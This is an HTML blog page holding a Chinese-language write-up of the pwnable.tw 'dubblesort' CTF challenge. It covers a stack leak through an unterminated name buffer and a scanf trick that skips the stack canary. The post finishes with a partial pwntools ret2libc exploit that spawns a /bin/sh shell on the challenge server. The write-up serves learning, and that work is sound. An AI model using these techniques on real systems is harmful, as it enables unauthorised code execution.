@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="pwnable.tw_challenge_dubblesort首先运行一下大概了解程序的流程： 12345678910运行结果What your name :kirinHello kirin��&#x2F;,How many numbers do you what to sort :3Enter the 0 number : 4  Enter the 1 number : 5Enter the 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw_dublesort">
+<meta property="og:url" content="http://yoursite.com/2018/06/04/pwnable-tw-dublesort/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="pwnable.tw_challenge_dubblesort首先运行一下大概了解程序的流程： 12345678910运行结果What your name :kirinHello kirin��&#x2F;,How many numbers do you what to sort :3Enter the 0 number : 4  Enter the 1 number : 5Enter the 2">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-fbfd0d45f5691308.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-568f960c059a34b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-ec0dc704cba01f29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-0fe9ac7b4034191a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-298f40a7b2079841.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-975cf0a24bd843e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-c8191cce71d30662.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-d264056f42887a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-3bceb9d9640ffc9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-dc5b30c5b1aa190c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2018-06-04T13:56:21.000Z">
+<meta property="article:modified_time" content="2018-08-15T14:09:02.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-fbfd0d45f5691308.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>pwnable.tw_dublesort</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/06/05/pwnable-tw-hacknote/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/06/03/pwnable-tw-calc/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&text=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&is_video=false&description=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_dublesort&body=Check out this article: http://yoursite.com/2018/06/04/pwnable-tw-dublesort/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&title=pwnable.tw_dublesort" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/04/pwnable-tw-dublesort/&name=pwnable.tw_dublesort&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-dubblesort"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_dubblesort</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-main"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-字符串结尾-x00截断问题"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 字符串结尾\x00截断问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-scanf读取unsigned数时非法字符问题"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x02 scanf读取unsigned数时非法字符问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-ret2libc"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x03 ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#0x01-system的偏移量"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">0x01 system的偏移量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x02-“-bin-sh”的偏移量"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">0x02  “\bin\sh”的偏移量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x03-程序加载libc库的基地址"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">0x03 程序加载libc库的基地址</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#栈中数据构造"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">栈中数据构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwnable.tw_dublesort
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-06-04T13:56:21.000Z" itemprop="datePublished">2018-06-04</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="pwnable-tw-challenge-dubblesort"><a href="#pwnable-tw-challenge-dubblesort" class="headerlink" title="pwnable.tw_challenge_dubblesort"></a>pwnable.tw_challenge_dubblesort</h3><p>首先运行一下大概了解程序的流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">运行结果</span><br><span class="line">What your name :kirin</span><br><span class="line">Hello kirin</span><br><span class="line">��&#x2F;,How many numbers do you what to sort :3</span><br><span class="line">Enter the 0 number : 4  </span><br><span class="line">Enter the 1 number : 5</span><br><span class="line">Enter the 2 number : 6</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">4 5 6</span><br></pre></td></tr></table></figure>
+<p>首先是传入一个name<br>而后需要我们指出需要排序的数字个数<br>而后需要我们依次输入需要排序的数字<br>最后程序给出排序好的result<br>不过这里发现一个问题，<strong>有些名字后存在其他字符（类似乱码）</strong><br><strong>猜测这里应该是字符串00结尾没有处理好而泄露了名字后的部分数据</strong><br>先记下这个问题<br>下面载入IDA分析：</p>
+<h4 id="0x01-main"><a href="#0x01-main" class="headerlink" title="0x01 main"></a>0x01 main</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    edi</span><br><span class="line">push    esi</span><br><span class="line">push    ebx</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">add     esp, 0FFFFFF80h</span><br><span class="line">call    sub_5662B750</span><br><span class="line">add     ebx, 15CCh</span><br><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [esp+7Ch], eax</span><br><span class="line">xor     eax, eax</span><br><span class="line">call    sub_5662B8B5</span><br></pre></td></tr></table></figure>
+<p>可以看出这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">开启了canary保护：mov     eax, large gs:14h</span><br><span class="line">调用了一个sub_5662B8B5函数（一个计时器）</span><br><span class="line">可以直接绕过这个计时器来动态分析：</span><br><span class="line">call    sub_5662B8B5改为nop</span><br><span class="line">或者：在call地址后的首句push ebp改为retn</span><br><span class="line">或者：类似方法去除程序对alarm&#x2F;signal的调用</span><br><span class="line">或者：直接改变alarm的参数（加长时间）</span><br><span class="line">或者：调试到alarm时set新的ip跳过call alarm</span><br><span class="line">在gdb中可以忽略中间信号来绕过计时器：</span><br><span class="line">i handle SIGALRM</span><br><span class="line">handle SIGALRM nopass</span><br></pre></td></tr></table></figure>
+<p>下面：<br>输出”What your name :”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:5662B9EB                 lea     eax, (aWhatYourName - 5662CFA0h)[ebx] ; &quot;What your name :&quot;</span><br><span class="line">.text:5662B9F1                 mov     [esp+4], eax</span><br><span class="line">.text:5662B9F5                 mov     dword ptr [esp], 1</span><br><span class="line">.text:5662B9FC                 call    ___printf_chk</span><br></pre></td></tr></table></figure>
+<p>从输入流读入0x40长度(输入流结尾自动停止读入)的字节到esp+8Ch+buf处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:5662BA01                 mov     dword ptr [esp+8], 40h ; &#39;@&#39; ; nbytes</span><br><span class="line">.text:5662BA09                 lea     esi, [esp+8Ch+buf]</span><br><span class="line">.text:5662BA0D                 mov     [esp+4], esi    ; buf</span><br><span class="line">.text:5662BA11                 mov     dword ptr [esp], 0 ; fd</span><br><span class="line">.text:5662BA18                 call    _read</span><br></pre></td></tr></table></figure>
+<p>输出”Hello %s,How many numbers do you what to sort :”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     [esp+8], esi</span><br><span class="line">lea     eax, (aHelloSHowManyN - 5662CFA0h)[ebx] ; &quot;Hello %s,How many numbers do you what t&quot;...</span><br><span class="line">mov     [esp+4], eax</span><br><span class="line">mov     dword ptr [esp], 1</span><br><span class="line">call    ___printf_chk</span><br></pre></td></tr></table></figure>
+<p>使用scanf读入一个unsigned型数（所需排序个数）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:5662BA37                 lea     eax, [esp+18h]</span><br><span class="line">.text:5662BA3B                 mov     [esp+4], eax</span><br><span class="line">.text:5662BA3F                 lea     eax, (aU - 5662CFA0h)[ebx] ; &quot;%u&quot;</span><br><span class="line">.text:5662BA45                 mov     [esp], eax</span><br><span class="line">.text:5662BA48                 call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
+<p>接下来再调用scanf读入相应个数的unsigned并调用一个冒泡排序:sub_5662B931<br>最终输出结果</p>
+<h4 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h4><h5 id="0x01-字符串结尾-x00截断问题"><a href="#0x01-字符串结尾-x00截断问题" class="headerlink" title="0x01 字符串结尾\x00截断问题"></a>0x01 字符串结尾\x00截断问题</h5><p><strong>首先就是开始时候的name可以泄露栈内数据：</strong><br>当我们输入：”aaaa”<br>程序输出：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-fbfd0d45f5691308.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="aaaa"><br>看一下栈内数据：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-568f960c059a34b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="栈"><br>可以看到buff内数据是<strong>aaaa+’\n’</strong>，而后面没有对字符串结尾加上00进行截断，导致后面的FFBA4B00上的数据在换行之后也输出了，直到遇到FFBA4804处的”\x00”</p>
+<h5 id="0x02-scanf读取unsigned数时非法字符问题"><a href="#0x02-scanf读取unsigned数时非法字符问题" class="headerlink" title="0x02 scanf读取unsigned数时非法字符问题"></a>0x02 scanf读取unsigned数时非法字符问题</h5><p>测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;int i;</span><br><span class="line">while(~scanf(&quot;%u&quot;,&amp;i))</span><br><span class="line">printf(&quot;%u\n&quot;,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当输入一个非法字符时，其可能会因输入流问题直接输出栈上数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当输入&quot;+-&quot;这类数字本身中就有（&quot;+-&quot;代表正负）的字符，则输出栈上数据</span><br><span class="line">+</span><br><span class="line">32764</span><br><span class="line">-</span><br><span class="line">32764</span><br><span class="line">当输入&quot;abc......&quot;这类非法字符，因为输入流问题，这里没有成功scanf，便不断printf数据</span><br><span class="line">a</span><br><span class="line">32764</span><br><span class="line">32764</span><br><span class="line">32764</span><br><span class="line">32764</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
+<p>在程序中测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> .&#x2F;dubblesort</span><br><span class="line">What your name :kirin</span><br><span class="line">Hello kirin</span><br><span class="line">��&#x2F;,How many numbers do you what to sort :5</span><br><span class="line">Enter the 0 number : +</span><br><span class="line">Enter the 1 number : +</span><br><span class="line">Enter the 2 number : + </span><br><span class="line">Enter the 3 number : +</span><br><span class="line">Enter the 4 number : +</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">0 1 12779520 4158922506 4291112735</span><br></pre></td></tr></table></figure>
+<p>我们输入前栈中v13(保存需要排序的数字)处的数据分布：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-ec0dc704cba01f29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="v13"><br>排序输出后：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-0fe9ac7b4034191a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="v13"><br><strong>可以看到我们这里输入”+”并不改变栈内数据，而是对其中的数据重新排序</strong></p>
+<h5 id="0x03-ret2libc"><a href="#0x03-ret2libc" class="headerlink" title="0x03 ret2libc"></a>0x03 ret2libc</h5><p>首先使用chechsec看一下程序的保护机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec .&#x2F;dubblesort</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-298f40a7b2079841.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>可以看到全部开启<br>考虑到调试过程发现其加载了libc库以及：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R .&#x2F;dubblesort</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-975cf0a24bd843e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="objdump"><br>这里我们可以利用ret2libc执行system(“/bin/sh”)来获取shell<br>我们需要：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对方环境下libc动态库中函数system的偏移量</span><br><span class="line">对方环境下libc动态库中字符串&quot;\bin\sh&quot;的偏移量</span><br><span class="line">程序加载libc库的基地址</span><br><span class="line">合理布置栈来执行函数</span><br></pre></td></tr></table></figure>
+<h6 id="0x01-system的偏移量"><a href="#0x01-system的偏移量" class="headerlink" title="0x01 system的偏移量"></a>0x01 system的偏移量</h6><p>利用题目给出的库文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s .&#x2F;libc_32.so.6|grep system</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_off &#x3D; 0x3a940</span><br></pre></td></tr></table></figure>
+<h6 id="0x02-“-bin-sh”的偏移量"><a href="#0x02-“-bin-sh”的偏移量" class="headerlink" title="0x02  “\bin\sh”的偏移量"></a>0x02  “\bin\sh”的偏移量</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C .&#x2F;libc_32.so.6|grep  &#x2F;bin -A 1  #防止换行所以只grep &#x2F;bin 而后显示后一行</span><br></pre></td></tr></table></figure>
+<p>找到了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00158e80  74 6f 64 5f 6c 2e 63 00  2d 63 00 2f 62 69 6e 2f  |tod_l.c.-c.&#x2F;bin&#x2F;|</span><br><span class="line">00158e90  73 68 00 65 78 69 74 20  30 00 63 61 6e 6f 6e 69  |sh.exit 0.canoni|</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin_sh_off &#x3D; 0x158e8b</span><br></pre></td></tr></table></figure>
+<h6 id="0x03-程序加载libc库的基地址"><a href="#0x03-程序加载libc库的基地址" class="headerlink" title="0x03 程序加载libc库的基地址"></a>0x03 程序加载libc库的基地址</h6><p>若要获取基地址，便要得到一个相对基地址偏移量固定的地址<br>而能泄露数据的只有name和最后的排序处<br>但排序处会直接结束进程<br>我们需要利用排序前的scanf来布置栈空间<br>所以这里只能利用name泄露buf后某个栈内地址<br>动态调试看一下name后的栈内数据：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-c8191cce71d30662.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="buf"><br>可以看到第七和第八个数据都在libc中<br>接着调试后锁定第七个数据：<br>看一下这次载入libc的地址：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-d264056f42887a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="libc"><br>第七位地址的相对位移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off&#x3D;0xf7f70000-0xf7dbe000&#x3D;0x1b2000</span><br></pre></td></tr></table></figure>
+<p><strong>注意：这里的偏移地址是相对于本地的libc-2.23.so文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S .&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-3bceb9d9640ffc9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="libc"><br>看到这里的对应偏移位置是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt</span><br></pre></td></tr></table></figure>
+<p>对应远程的libc文件的.got.plt的偏移地址为：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-dc5b30c5b1aa190c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="libc"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1b0000</span><br></pre></td></tr></table></figure>
+<h6 id="栈中数据构造"><a href="#栈中数据构造" class="headerlink" title="栈中数据构造"></a>栈中数据构造</h6><p>这里需要注意：<br>栈内数据写入后会被排序<br>所以我们要让排序后的栈内：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cannary处 -&gt; 输入加号使其保持不变</span><br><span class="line">返回地址处 -&gt; system_addr</span><br><span class="line">返回地址后一个单位 -&gt; system的返回地址(随意填写，不过注意大小问题，这里直接填入system_addr或者bin_sh_addr)</span><br><span class="line">返回地址后第二位 -&gt; bin_sh_addr</span><br></pre></td></tr></table></figure>
+<p>一般情况下这几个数便是从小到大排列（除非canary随机到很大）<br>所以我们：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先将数字正常的栈空间覆盖为0(调试后是24位)</span><br><span class="line">canary处:&quot;+&quot;</span><br><span class="line">canary到返回地址间覆盖为system_addr</span><br><span class="line">返回地址后一位system函数返回地址处覆盖为system_addr或者bin_sh_addr</span><br><span class="line">再后一位覆盖为bin_sh_addr</span><br></pre></td></tr></table></figure>
+<p>不过当输入字符来利用name获得.got.plt地址时总是出错<br>调试后发现，这个地址末位总是00，造成了截断，所以需要多输入一位来使用换行符（chr(0xa)）来覆盖这里（在后面计算地址的时候再减去0xa）</p>
+<h4 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">got_off &#x3D; 0x1b0000</span><br><span class="line">system_off &#x3D; 0x3a940</span><br><span class="line">bin_sh_off &#x3D; 0x158e8b</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;chall.pwnable.tw&quot;,10101)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;a&#39;*24)</span><br><span class="line">got_addr &#x3D; u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr &#x3D; got_addr-got_off</span><br><span class="line">system_addr &#x3D; libc_addr + system_off</span><br><span class="line">bin_sh_addr &#x3D; libc_addr + bin_sh_off</span><br><span class="line">p.sendline(&#39;35&#39;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&#39;0&#39;)</span><br><span class="line">    